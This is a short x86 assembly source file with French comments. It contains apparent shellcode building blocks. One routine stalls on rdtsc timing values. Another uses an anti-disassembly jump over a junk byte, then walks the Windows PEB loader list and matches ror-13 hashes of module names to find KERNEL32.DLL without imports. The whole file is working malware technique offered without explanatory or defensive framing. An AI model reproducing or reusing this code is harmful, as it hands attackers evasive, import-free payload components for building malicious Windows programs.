section .text
GLOBAL _startrand
GLOBAL _findkernel

; Demarrage ... space
_startrand:

rloop:
		rdtsc
		add	eax,edx
		and eax,0xffff
		cmp eax,0x0fff
		ja rloop

		mov eax,1 ; return True
		ret


_findkernel:
	push esi
	push edi
	push ebx
	push	here
	push byte 0x10
	pop eax
	add eax,0x10
	mov	edx,0x10
  cmp eax,0x20 		
	jne  fake	  
	ret	
fake:
	db 0xfe	
here:
	mov edx, [fs:edx+eax]  ;  pointer sur PEB  fs:0x30
  mov eax,0x90909090 
	mov edx, [edx+0x0C]    ;  pointeur sur  PEB->Ldr
  mov edx, [edx+0x14]    ;  premier module de la liste InMemoryOrder 
next_module:
  mov esi, [edx+0x28]    ;  pointeur sur la liste (unicode)
  xor edi, edi           ;  edi = destination du hash
	mov ecx,24						 ;  taille de la string
loop_modulename:
  xor eax, eax           
  lodsb                  ; read le byte du nom
  cmp al, 'Z'            ; conversion si besoin en majuscule
  jb  noupper
  sub al, 0x20           
noupper
  ror edi, 13            ; mov the hash
  add edi, eax           ; ajout du byte dans le hash
  loop loop_modulename      ; dec ecx loop
	cmp edi, 0x6A4ABC5B    ; test le hash (on cherche  h KERNEL32.DLL
  mov edx, [edx]         ; choppe le module suivant
  mov ebx, [edx+0x10]    ;// get this modules base address
jne next_module           ; on loop ou on sort si c'etait le bon
 
  mov eax,ebx
	
	pop	ebx
	pop	edi
	pop esi
 	ret


